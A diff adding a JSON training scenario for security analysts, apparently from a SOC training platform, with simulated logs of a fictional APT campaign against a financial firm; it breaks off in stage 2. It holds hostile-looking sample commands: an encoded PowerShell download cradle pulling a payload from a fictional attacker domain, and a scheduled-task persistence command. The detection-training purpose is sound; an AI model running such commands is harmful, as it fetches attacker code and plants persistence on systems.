@@ -1,0 +1,1523 @@
+{
+  "name": "Multi-Stage APT Campaign \u2014 Full Kill Chain",
+  "description": "An advanced scenario simulating a complete APT campaign by threat group 'SilkTyphoon' targeting a financial services company. Covers the full Cyber Kill Chain from spearphishing initial access through credential theft, lateral movement, data exfiltration, and ransomware impact. Analysts must investigate 30+ logs across 5 stages, identify all compromised systems, and recommend containment actions.",
+  "difficulty": "ADVANCED",
+  "category": "Advanced Persistent Threat",
+  "mitreAttackIds": ["T1566.001", "T1059.001", "T1547.001", "T1003.001", "T1550.002", "T1021.002", "T1486", "T1070.001"],
+  "briefing": "## CRITICAL ALERT \u2014 This is not a drill.\n\nYour SIEM has correlated multiple high-severity alerts into a single incident chain targeting your organization. Initial indicators suggest a sophisticated threat actor with characteristics matching APT group **'SilkTyphoon'** (known for targeting financial services).\n\nThe attack appears to have originated from a **spearphishing email** sent to the CFO. Multiple systems may already be compromised.\n\n### What We Know So Far\n\n- **08:45 UTC** \u2014 Targeted phishing email delivered to CFO (r.johnson)\n- **08:47 UTC** \u2014 Malicious macro execution detected on WS-EXEC01\n- **09:xx UTC** \u2014 C2 beaconing observed to external infrastructure\n- **10:xx UTC** \u2014 Credential theft indicators on compromised host\n- **11:xx UTC** \u2014 Lateral movement across multiple servers\n- **13:xx UTC** \u2014 Large data transfers to external IPs\n- **14:xx UTC** \u2014 Ransomware indicators and anti-forensics activity\n\n### Your Mission\n\n1. **Investigate** every stage of this attack from initial access to impact\n2. **Identify** all compromised systems, accounts, and attacker infrastructure\n3. **Collect evidence** by flagging critical logs in each stage\n4. **Recommend containment actions** at each phase\n5. **Build a complete timeline** of the attack progression\n\n### Affected Assets\n\n| Hostname | IP Address | Role |\n|---|---|---|\n| WS-EXEC01 | 10.0.1.25 | CFO Workstation |\n| WS-PC20 | 10.0.1.60 | Employee Workstation |\n| SRV-FS01 | 10.0.3.10 | File Server |\n| SRV-APP02 | 10.0.3.25 | Application Server |\n| SRV-DC01 | 10.0.2.5 | Domain Controller |\n\n### Known Threat Actor Infrastructure\n\n| Indicator | Type |\n|---|---|\n| 185.191.32.44 | C2 Server |\n| cdn-update.silktyphoon.xyz | C2 Domain |\n| 91.215.85.17 | Exfiltration Server |\n\n**Time is critical \u2014 the attacker is still active...**",
+  "lessonContent": "# Multi-Stage APT Campaign \u2014 Pre-Investigation Lesson\n\nBefore you begin this advanced investigation, review the key concepts you will need to analyze a full-spectrum APT attack.\n\n---\n\n## 1. The Cyber Kill Chain (Lockheed Martin Model)\n\nThe Cyber Kill Chain is a framework developed by Lockheed Martin that describes the stages of a cyber intrusion. Understanding this model helps defenders identify where an attack is in its lifecycle and where to intervene.\n\n| Phase | Description | Defender Opportunity |\n|---|---|---|\n| **1. Reconnaissance** | Attacker researches the target (OSINT, LinkedIn, public filings) | Monitor for targeted scanning, social engineering attempts |\n| **2. Weaponization** | Attacker creates a deliverable payload (malicious document, exploit kit) | Threat intelligence sharing, sandbox analysis |\n| **3. Delivery** | Payload is transmitted to the target (email, web, USB) | Email gateway filtering, web proxies, user awareness |\n| **4. Exploitation** | Vulnerability or user action triggers execution (macro, exploit) | Endpoint protection, application whitelisting, patching |\n| **5. Installation** | Malware is installed for persistent access (backdoor, implant) | EDR detection, file integrity monitoring, behavioral analysis |\n| **6. Command & Control** | Malware communicates with attacker infrastructure | Network monitoring, DNS analysis, proxy inspection |\n| **7. Actions on Objectives** | Attacker achieves their goal (data theft, destruction, ransom) | DLP, network segmentation, incident response |\n\n**Key Insight:** Every phase the attacker completes successfully makes detection and containment harder. The earlier you detect, the lower the impact.\n\n---\n\n## 2. APT Group Characteristics\n\nAdvanced Persistent Threats are fundamentally different from opportunistic attacks:\n\n### What Makes an APT \"Advanced\"?\n- **Custom tooling** \u2014 Bespoke malware, zero-day exploits, living-off-the-land binaries (LOLBins)\n- **Operational security** \u2014 Encrypted C2, domain fronting, traffic blending\n- **Defense evasion** \u2014 Timestomping, log clearing, process injection, fileless techniques\n\n### What Makes an APT \"Persistent\"?\n- **Multiple persistence mechanisms** \u2014 Registry keys AND scheduled tasks AND services\n- **Redundant C2 channels** \u2014 Primary HTTP/S beacon, fallback DNS tunnel\n- **Re-compromise capability** \u2014 Stolen credentials cached for later use\n- **Patience** \u2014 Weeks to months of dwell time before final objectives\n\n### What Makes an APT a \"Threat\"?\n- **Specific targeting** \u2014 Tailored spearphishing, industry-specific lures\n- **Clear objectives** \u2014 Intellectual property theft, financial fraud, espionage, disruption\n- **Resourced operators** \u2014 Nation-state backing or well-funded criminal organizations\n\n---\n\n## 3. Kill Chain Phases Mapped to MITRE ATT&CK\n\nThis scenario covers the following MITRE ATT&CK techniques at each kill chain phase:\n\n### Initial Access (Delivery + Exploitation)\n- **T1566.001 \u2014 Phishing: Spearphishing Attachment** \u2014 Malicious Excel document with embedded macro sent to a high-value target\n\n### Execution\n- **T1059.001 \u2014 Command and Scripting Interpreter: PowerShell** \u2014 Macro launches PowerShell to download and execute the second-stage payload\n\n### Persistence (Installation)\n- **T1547.001 \u2014 Boot or Logon Autostart Execution: Registry Run Keys** \u2014 Malware adds itself to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence across reboots\n\n### Credential Access\n- **T1003.001 \u2014 OS Credential Dumping: LSASS Memory** \u2014 Attacker dumps credentials from the Local Security Authority Subsystem Service (LSASS) process memory\n\n### Lateral Movement\n- **T1550.002 \u2014 Use Alternate Authentication Material: Pass the Hash** \u2014 Attacker uses stolen NTLM hashes to authenticate to remote systems without knowing plaintext passwords\n- **T1021.002 \u2014 Remote Services: SMB/Windows Admin Shares** \u2014 Attacker uses PsExec and admin shares (C$, ADMIN$) to execute commands on remote hosts\n\n### Impact\n- **T1486 \u2014 Data Encrypted for Impact** \u2014 Ransomware encrypts files across compromised systems for extortion\n\n### Defense Evasion\n- **T1070.001 \u2014 Indicator Removal: Clear Windows Event Logs** \u2014 Attacker clears event logs to destroy forensic evidence\n\n---\n\n## 4. How to Investigate Each Phase\n\n### Phase 1: Initial Access Investigation\n- Check email gateway logs for the delivery vector (sender, subject, attachment hashes)\n- Look for SPF/DKIM/DMARC failures or spoofed sender domains\n- Identify the targeted user and their workstation\n- Check if any other users received the same email\n\n### Phase 2: Execution & Persistence Investigation\n- Look for Office applications spawning script interpreters (Word/Excel -> cmd/powershell)\n- Check Sysmon Event 1 for process creation chains\n- Identify the payload download URL and C2 infrastructure\n- Search for persistence mechanisms: registry keys (Event 13), scheduled tasks (Event 1 with schtasks), services (Event 7045)\n- Look for renamed binaries or files in unusual directories\n\n### Phase 3: Credential Theft Investigation\n- Check for LSASS access (Sysmon Event 10 with TargetImage lsass.exe)\n- Look for known credential dumping tools (Mimikatz, ProcDump, comsvcs.dll)\n- Check for SeDebugPrivilege assignment (Event 4672)\n- Monitor for explicit credential logon events (Event 4648)\n\n### Phase 4: Lateral Movement Investigation\n- Track network logon events (Event 4624 Type 3) across multiple hosts\n- Look for NTLM authentication where Kerberos would be normal\n- Check for PsExec service installation (PSEXESVC) on remote hosts\n- Monitor SMB traffic patterns (port 445) between internal hosts\n- Watch for domain enumeration commands (net group, nltest, etc.)\n\n### Phase 5: Impact Investigation\n- Look for file compression (7zip, WinRAR) of sensitive directories\n- Monitor for large outbound transfers to external IPs\n- Check for ransomware indicators: mass file modifications, vssadmin shadow copy deletion\n- Look for anti-forensics: event log clearing (Event 1102), timestomping\n\n---\n\n## 5. Incident Response Priorities\n\nWhen responding to an active APT compromise, follow this priority order:\n\n### Contain (First Priority)\n1. **Isolate compromised endpoints** from the network (but do NOT power off \u2014 preserve memory)\n2. **Block C2 infrastructure** at the firewall and DNS level\n3. **Disable compromised accounts** (especially domain admin)\n4. **Segment critical assets** (domain controllers, file servers)\n\n### Eradicate (Second Priority)\n1. **Remove persistence mechanisms** (registry keys, scheduled tasks, services)\n2. **Clean or reimage compromised systems** (reimaging is preferred)\n3. **Reset ALL credentials** that may have been exposed (assume all cached credentials are compromised)\n4. **Patch the initial access vector** (email filtering rules, endpoint protection updates)\n\n### Recover (Third Priority)\n1. **Restore from known-good backups** (verify backup integrity first)\n2. **Monitor for re-compromise indicators** (the attacker will try to return)\n3. **Implement additional detection rules** based on observed TTPs\n4. **Conduct a full threat hunt** across the environment\n\n---\n\n## 6. The Importance of Threat Intelligence\n\nThreat intelligence transforms reactive security into proactive defense:\n\n- **Strategic intel** \u2014 Who targets your industry? What are their objectives?\n- **Tactical intel** \u2014 What TTPs does the threat group use? What does their malware look like?\n- **Operational intel** \u2014 What infrastructure do they use? What domains, IPs, and tools?\n- **Technical intel** \u2014 IOCs: file hashes, IP addresses, domain names, YARA rules\n\n### Applying Threat Intel in This Scenario\n\n- The threat group **SilkTyphoon** is known to target financial services\n- Their typical kill chain matches what you will observe: spearphishing -> PowerShell -> credential theft -> lateral movement -> double extortion (exfil + ransom)\n- Known infrastructure patterns: bulletproof hosting providers, fast-flux DNS, .xyz TLD domains\n- Sharing IOCs from this incident with ISACs and partner organizations helps protect the broader community\n\n---\n\n## Ready?\n\nThis is the most challenging scenario in the training platform. You will analyze 30+ logs across 5 attack stages and answer 15 checkpoint questions testing your ability to investigate, classify, and respond to a real-world APT campaign.\n\nClick **Continue to Investigation** to begin. Good luck, analyst.",
+  "estimatedMinutes": 75,
+  "isActive": true,
+  "stages": [
+    {
+      "stageNumber": 1,
+      "title": "Initial Access \u2014 Spearphishing the CFO",
+      "description": "A targeted spearphishing email was delivered to the CFO's mailbox containing a weaponized Excel document. The macro executed immediately upon opening, launching PowerShell to download a second-stage payload from the attacker's C2 infrastructure.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EMAIL_GATEWAY",
+          "summary": "Email Gateway \u2014 Inbound email from external sender 'david.chen@partnerfin-group.com' to CFO r.johnson@corpsec.local with subject 'Q3 Financial Report - Urgent Review Required'. Attachment: Q3-Financial-Report.xlsm (macro-enabled Excel). SPF passed but DMARC alignment failed.",
+          "rawLog": {
+            "messageId": "<4a8f2e1d-9c3b-47a2-b8e6-1f5d3c7a9b2e@mail.partnerfin-group.com>",
+            "timestamp": "2025-10-14T08:45:11Z",
+            "direction": "INBOUND",
+            "sender": "david.chen@partnerfin-group.com",
+            "senderDisplayName": "David Chen - Partner Financial Group",
+            "recipient": "r.johnson@corpsec.local",
+            "subject": "Q3 Financial Report - Urgent Review Required",
+            "attachments": [
+              {
+                "filename": "Q3-Financial-Report.xlsm",
+                "size": 284672,
+                "contentType": "application/vnd.ms-excel.sheet.macroEnabled.12",
+                "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+              }
+            ],
+            "spfResult": "pass",
+            "dkimResult": "pass",
+            "dmarcResult": "fail",
+            "dmarcAlignment": "relaxed-fail",
+            "xMailer": "Microsoft Outlook 16.0",
+            "receivedHeaders": [
+              "from mail-out01.bulletproof-host.net (185.191.32.44) by mx01.corpsec.local",
+              "from internal-relay.partnerfin-group.com (10.50.1.2) by mail-out01.bulletproof-host.net"
+            ],
+            "threatScore": 35,
+            "action": "DELIVERED",
+            "quarantineReason": null,
+            "headerAnalysis": {
+              "returnPath": "bounce-handler@bulletproof-host.net",
+              "replyTo": "david.chen@partnerfin-group.com",
+              "xOrigIP": "185.191.32.44"
+            }
+          },
+          "severity": "MEDIUM",
+          "hostname": "MX-GW01",
+          "username": "r.johnson",
+          "sourceIp": "185.191.32.44",
+          "destIp": "10.0.1.25",
+          "timestamp": "2025-10-14T08:45:11Z",
+          "isEvidence": true,
+          "evidenceTag": "phishing-email-delivery",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 1 \u2014 Process creation: EXCEL.EXE spawned powershell.exe on WS-EXEC01. This is a classic indicator of malicious macro execution. The PowerShell command uses -EncodedCommand with a Base64 payload.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T08:47:33Z",
+            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
+            "ProcessId": 7324,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABjAGwAaQBlAG4AdAAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwAHMAOgAvAC8AYwBkAG4ALQBzAGUAYwB1AHIAaQB0AHkALgBzAGkAbABrAHQAeQBwAGgAbwBvAG4ALgB4AHkAegAvAHUAcABkAGEAdABlAC4AZABhAHQAJwAsACAAJwBDADoAXABVAHMAZQByAHMAXAByAC4AagBvAGgAbgBzAG8AbgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAdQBwAGQAYQB0AGUALgBkAGEAdAAnACkA",
+            "CurrentDirectory": "C:\\Users\\r.johnson\\Documents\\",
+            "User": "CORPSEC\\r.johnson",
+            "LogonGuid": "{a1b2c3d4-0001-0002-0003-000000000001}",
+            "LogonId": "0x3E7A1B",
+            "TerminalSessionId": 1,
+            "IntegrityLevel": "Medium",
+            "Hashes": "SHA256=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
+            "ParentProcessGuid": "{a1b2c3d4-abcd-1234-5678-901234567890}",
+            "ParentProcessId": 3456,
+            "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+            "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\r.johnson\\Downloads\\Q3-Financial-Report.xlsm\"",
+            "ParentUser": "CORPSEC\\r.johnson"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2025-10-14T08:47:33Z",
+          "isEvidence": true,
+          "evidenceTag": "macro-powershell-execution",
+          "sortOrder": 2
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert (HIGH) \u2014 Office application spawned a script interpreter. EXCEL.EXE launched powershell.exe with encoded command on WS-EXEC01 as user r.johnson. This matches MITRE ATT&CK technique T1059.001.",
+          "rawLog": {
+            "alertId": "EDR-2025-18744",
+            "severity": "HIGH",
+            "timestamp": "2025-10-14T08:47:34Z",
+            "hostname": "WS-EXEC01",
+            "username": "r.johnson",
+            "processName": "powershell.exe",
+            "processPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "commandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand JABjAGwAaQBlAG4AdA...",
+            "parentProcess": "EXCEL.EXE",
+            "parentProcessPath": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+            "alertType": "Office Application Spawned Script Interpreter",
+            "detectionRule": "OFFICE_CHILD_SCRIPTING_ENGINE",
+            "mitreTactic": "Execution",
+            "mitreTechnique": "T1059.001",
+            "riskScore": 92,
+            "action": "ALERT_ONLY",
+            "fileHash": "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
+            "networkConnections": [
+              {
+                "destIp": "185.191.32.44",
+                "destPort": 443,
+                "protocol": "HTTPS"
+              }
+            ]
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "powershell.exe",
+          "sourceIp": "10.0.1.25",
+          "destIp": "185.191.32.44",
+          "timestamp": "2025-10-14T08:47:34Z",
+          "isEvidence": true,
+          "evidenceTag": "edr-macro-execution-alert",
+          "sortOrder": 3
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 3 \u2014 Network connection: powershell.exe on WS-EXEC01 initiated outbound HTTPS connection to 185.191.32.44:443 (C2 server). This is the payload download triggered by the macro.",
+          "rawLog": {
+            "EventID": 3,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T08:47:36Z",
+            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
+            "ProcessId": 7324,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "User": "CORPSEC\\r.johnson",
+            "Protocol": "tcp",
+            "Initiated": true,
+            "SourceIsIpv6": false,
+            "SourceIp": "10.0.1.25",
+            "SourceHostname": "WS-EXEC01.corpsec.local",
+            "SourcePort": 49721,
+            "SourcePortName": "",
+            "DestinationIsIpv6": false,
+            "DestinationIp": "185.191.32.44",
+            "DestinationHostname": "",
+            "DestinationPort": 443,
+            "DestinationPortName": "https"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "powershell.exe",
+          "sourceIp": "10.0.1.25",
+          "destIp": "185.191.32.44",
+          "eventId": "3",
+          "timestamp": "2025-10-14T08:47:36Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-payload-download",
+          "sortOrder": 4
+        },
+        {
+          "logType": "DNS",
+          "summary": "DNS Query \u2014 WS-EXEC01 resolved cdn-update.silktyphoon.xyz to 185.191.32.44. This is the C2 domain used by the SilkTyphoon threat actor for payload delivery and command-and-control.",
+          "rawLog": {
+            "timestamp": "2025-10-14T08:47:35Z",
+            "queryId": 48291,
+            "sourceIp": "10.0.1.25",
+            "sourcePort": 54832,
+            "dnsServer": "10.0.2.5",
+            "queryName": "cdn-update.silktyphoon.xyz",
+            "queryType": "A",
+            "queryClass": "IN",
+            "responseCode": "NOERROR",
+            "responseData": "185.191.32.44",
+            "ttl": 300,
+            "flags": "QR RD RA",
+            "answerCount": 1,
+            "hostname": "WS-EXEC01",
+            "registrationDate": "2025-09-28",
+            "registrar": "NameSilo LLC",
+            "whoisOrg": "REDACTED FOR PRIVACY"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "sourceIp": "10.0.1.25",
+          "destIp": "10.0.2.5",
+          "timestamp": "2025-10-14T08:47:35Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-domain-resolution",
+          "sortOrder": 5
+        },
+        {
+          "logType": "PROXY",
+          "summary": "Proxy Log \u2014 HTTPS connection from WS-EXEC01 (10.0.1.25) to cdn-update.silktyphoon.xyz (185.191.32.44) downloading encoded payload file 'update.dat' (287 KB). User-Agent indicates PowerShell webclient.",
+          "rawLog": {
+            "timestamp": "2025-10-14T08:47:37Z",
+            "sourceIp": "10.0.1.25",
+            "sourcePort": 49721,
+            "destIp": "185.191.32.44",
+            "destPort": 443,
+            "method": "GET",
+            "url": "https://cdn-update.silktyphoon.xyz/update.dat",
+            "httpVersion": "1.1",
+            "statusCode": 200,
+            "contentType": "application/octet-stream",
+            "contentLength": 294400,
+            "userAgent": "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1",
+            "referer": "-",
+            "action": "ALLOWED",
+            "category": "Uncategorized",
+            "tlsVersion": "TLSv1.2",
+            "sniHostname": "cdn-update.silktyphoon.xyz",
+            "hostname": "WS-EXEC01",
+            "username": "r.johnson",
+            "bytesIn": 294400,
+            "bytesOut": 512,
+            "duration": 1.8
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "sourceIp": "10.0.1.25",
+          "destIp": "185.191.32.44",
+          "timestamp": "2025-10-14T08:47:37Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-payload-proxy-log",
+          "sortOrder": 6
+        }
+      ],
+      "hints": [
+        {
+          "content": "Check the email gateway log carefully. The SPF result says 'pass' but look at the DMARC alignment and the Return-Path header. The actual originating IP (X-Orig-IP) points to the C2 server, not a legitimate mail server.",
+          "pointsPenalty": 3,
+          "sortOrder": 1
+        },
+        {
+          "content": "The Sysmon Event 1 log shows the critical parent-child relationship: EXCEL.EXE spawned powershell.exe. Office applications should NEVER spawn command interpreters. The -EncodedCommand flag contains a Base64-encoded download cradle.",
+          "pointsPenalty": 3,
+          "sortOrder": 2
+        },
+        {
+          "content": "The DNS log reveals the C2 domain: cdn-update.silktyphoon.xyz, registered only 16 days before the attack. The domain resolves to 185.191.32.44, which is the same IP in the email Received headers and the proxy download log.",
+          "pointsPenalty": 5,
+          "sortOrder": 3
+        }
+      ]
+    },
+    {
+      "stageNumber": 2,
+      "title": "Execution & Persistence \u2014 Establishing a Foothold",
+      "description": "The attacker's payload has been downloaded and decoded. A persistent backdoor is installed via registry Run key and scheduled task. The implant begins beaconing to the C2 server at regular intervals while disguising itself as a legitimate Windows process.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 11 \u2014 File creation: PowerShell dropped decoded payload to C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe. Note the deceptive filename mimicking the legitimate svchost.exe but located in an AppData temp directory.",
+          "rawLog": {
+            "EventID": 11,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T08:47:42Z",
+            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
+            "ProcessId": 7324,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TargetFilename": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "CreationUtcTime": "2025-10-14T08:47:42Z",
+            "User": "CORPSEC\\r.johnson",
+            "Hashes": "SHA256=d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "powershell.exe",
+          "eventId": "11",
+          "timestamp": "2025-10-14T08:47:42Z",
+          "isEvidence": true,
+          "evidenceTag": "payload-file-drop",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 13 \u2014 Registry value set: Run key modified on WS-EXEC01. Value 'WindowsSecurityUpdate' added to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run pointing to the dropped payload. This ensures the malware survives reboots.",
+          "rawLog": {
+            "EventID": 13,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T08:48:05Z",
+            "EventType": "SetValue",
+            "ProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
+            "ProcessId": 7324,
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdate",
+            "Details": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config %APPDATA%\\Microsoft\\config.dat",
+            "User": "CORPSEC\\r.johnson"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "powershell.exe",
+          "eventId": "13",
+          "timestamp": "2025-10-14T08:48:05Z",
+          "isEvidence": true,
+          "evidenceTag": "registry-persistence",
+          "sortOrder": 2
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 1 \u2014 Process creation: powershell.exe executed schtasks.exe to create a scheduled task named 'MicrosoftEdgeUpdateCore' as backup persistence. Task runs svchost32.exe every 15 minutes.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T08:48:18Z",
+            "ProcessGuid": "{b2c3d4e5-f6a7-8901-bcde-f01234567890}",
+            "ProcessId": 8412,
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" /tr \"C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent\" /sc minute /mo 15 /f",
+            "CurrentDirectory": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\",
+            "User": "CORPSEC\\r.johnson",
+            "LogonGuid": "{a1b2c3d4-0001-0002-0003-000000000001}",
+            "LogonId": "0x3E7A1B",
+            "IntegrityLevel": "Medium",
+            "Hashes": "SHA256=bc64ab8f5b2b1b9e5a60c3e34f1e98d8a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
+            "ParentProcessGuid": "{a1b2c3d4-e5f6-7890-abcd-ef0123456789}",
+            "ParentProcessId": 7324,
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ParentCommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand..."
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "schtasks.exe",
+          "eventId": "1",
+          "timestamp": "2025-10-14T08:48:18Z",
+          "isEvidence": true,
+          "evidenceTag": "scheduled-task-persistence",
+          "sortOrder": 3
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert (HIGH) \u2014 Multiple persistence mechanisms detected on WS-EXEC01. Registry Run key and scheduled task both point to the same suspicious binary in AppData\\Local\\Temp. Binary name 'svchost32.exe' appears to masquerade as legitimate svchost.exe.",
+          "rawLog": {
+            "alertId": "EDR-2025-18746",
+            "severity": "HIGH",
+            "timestamp": "2025-10-14T08:48:20Z",
+            "hostname": "WS-EXEC01",
+            "username": "r.johnson",
+            "processName": "svchost32.exe",
+            "processPath": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "alertType": "Multiple Persistence Mechanisms Detected",
+            "detectionRule": "PERSISTENCE_REGISTRY_AND_SCHTASK_COMBO",
+            "mitreTactic": "Persistence",
+            "mitreTechnique": "T1547.001",
+            "riskScore": 88,
+            "indicators": [
+              {
+                "type": "registry_run_key",
+                "path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecurityUpdate",
+                "value": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent --config %APPDATA%\\Microsoft\\config.dat"
+              },
+              {
+                "type": "scheduled_task",
+                "name": "MicrosoftEdgeUpdateCore",
+                "action": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe --silent",
+                "trigger": "Every 15 minutes"
+              }
+            ],
+            "binaryAnalysis": {
+              "name": "svchost32.exe",
+              "sha256": "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35",
+              "signed": false,
+              "originalFilename": "beacon_x64.exe",
+              "compileTimestamp": "2025-10-10T03:22:15Z",
+              "entropy": 7.4
+            }
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "svchost32.exe",
+          "timestamp": "2025-10-14T08:48:20Z",
+          "isEvidence": true,
+          "evidenceTag": "edr-persistence-alert",
+          "sortOrder": 4
+        },
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event 3 \u2014 Network connection: svchost32.exe on WS-EXEC01 initiated outbound HTTPS connection to 185.191.32.44:443. This is the initial C2 beacon from the implant after successful installation.",
+          "rawLog": {
+            "EventID": 3,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2025-10-14T08:49:01Z",
+            "ProcessGuid": "{c3d4e5f6-a7b8-9012-cdef-012345678901}",
+            "ProcessId": 9104,
+            "Image": "C:\\Users\\r.johnson\\AppData\\Local\\Temp\\svchost32.exe",
+            "User": "CORPSEC\\r.johnson",
+            "Protocol": "tcp",
+            "Initiated": true,
+            "SourceIsIpv6": false,
+            "SourceIp": "10.0.1.25",
+            "SourceHostname": "WS-EXEC01.corpsec.local",
+            "SourcePort": 49755,
+            "DestinationIsIpv6": false,
+            "DestinationIp": "185.191.32.44",
+            "DestinationHostname": "cdn-update.silktyphoon.xyz",
+            "DestinationPort": 443,
+            "DestinationPortName": "https"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "username": "r.johnson",
+          "processName": "svchost32.exe",
+          "sourceIp": "10.0.1.25",
+          "destIp": "185.191.32.44",
+          "eventId": "3",
+          "timestamp": "2025-10-14T08:49:01Z",
+          "isEvidence": true,
+          "evidenceTag": "c2-beacon-initial",
+          "sortOrder": 5
+        },
+        {
+          "logType": "NETWORK_FLOW",
+          "summary": "Network Flow \u2014 Repeating outbound HTTPS connections from WS-EXEC01 to 185.191.32.44:443 observed at 60-second intervals. Traffic pattern consistent with C2 beaconing. Each connection transfers approximately 1-2 KB outbound with variable inbound responses.",
+          "rawLog": {
+            "timestamp": "2025-10-14T09:15:00Z",
+            "flowSummary": "Aggregated flow data for 10.0.1.25 -> 185.191.32.44:443",
+            "srcIp": "10.0.1.25",
+            "srcHostname": "WS-EXEC01",
+            "dstIp": "185.191.32.44",
+            "dstPort": 443,
+            "protocol": "TCP",
+            "observationWindow": "08:49:01 - 09:15:00",
+            "connectionCount": 26,
+            "averageInterval": "60.2s",
+            "intervalStdDev": "1.8s",
+            "totalBytesOut": 38912,
+            "totalBytesIn": 52480,
+            "avgBytesPerConnectionOut": 1497,
+            "avgBytesPerConnectionIn": 2018,
+            "jitter": "low",
+            "beaconingScore": 0.97,
+            "tlsVersion": "TLSv1.2",
+            "ja3Hash": "e7d705a3286e19ea42f587b344ee6865",
+            "ja3sHash": "ae4edc6faf64d08308082ad26be60767",
+            "action": "ALLOW"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-EXEC01",
+          "sourceIp": "10.0.1.25",
+          "destIp": "185.191.32.44",
+          "timestamp": "2025-10-14T09:15:00Z",
